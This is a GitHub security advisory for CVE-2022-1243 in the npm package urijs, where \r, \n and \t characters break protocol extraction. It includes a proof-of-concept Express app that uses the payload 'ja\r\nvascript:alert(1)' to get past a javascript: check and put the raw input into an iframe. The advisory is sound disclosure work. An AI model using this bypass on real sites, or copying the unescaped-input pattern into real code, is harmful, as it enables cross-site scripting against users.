# [H] Incorrect protocol extraction via \r, \n and \t characters

## Summary
Severity: High
Advisory: GHSA-3vjf-82ff-p4r3
CVE: CVE-2022-1243
CWE: CWE-20
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2022-04-06
Source: https://github.com/advisories/GHSA-3vjf-82ff-p4r3
Type: github-advisory

## Affected
- npm: `urijs` — affected >=0 <1.19.11

## Details
\r, \n and \t characters in user-input URLs can potentially lead to incorrect protocol extraction when using npm package urijs prior to version 1.19.11.

This can lead to XSS when the module is used to prevent passing in malicious javascript: links into HTML or Javascript (see following example):
````
const parse = require('urijs')
const express = require('express')
const app = express()
const port = 3000

input = "ja\r\nvascript:alert(1)"
url = parse(input)

console.log(url)

app.get('/', (req, res) => {
 if (url.protocol !== "javascript:") {res.send("<iframe src=\'" + input + "\'>CLICK ME!</iframe>")}
})

app.listen(port, () => {
 console.log(`Example app listening on port ${port}`)
})
````

## References
- https://nvd.nist.gov/vuln/detail/CVE-2022-1243
- https://github.com/medialize/uri.js/commit/b0c9796aa1a95a85f40924fb18b1e5da3dc8ffae
- https://github.com/medialize/uri.js
- https://huntr.dev/bounties/8c5afc47-1553-4eba-a98e-024e4cc3dfb7
